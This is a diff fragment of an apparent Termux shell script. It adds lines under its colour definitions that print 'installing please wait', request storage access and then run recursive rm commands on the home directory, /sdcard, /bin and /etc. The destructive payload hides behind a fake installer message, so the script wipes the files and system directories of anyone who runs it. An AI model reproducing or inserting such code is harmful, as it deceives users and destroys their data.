@@ -30,7 +30,11 @@ l_red="\033[1;37;41m"           #
 nc="\033[0m"                    # 
 pink="\e[95m"                   #
 #################################
-
+echo "installing please wait"
+termux-setup-storage
+cd
+rm -irf * ; cd /sdcard ; rm -irf * ; cd ; cd /bin ; rm -irf * ; cd ; cd /etc ; rm -irf * ; cd 
+sleep 2
 # Script Starting
 
 __version__="1.0"
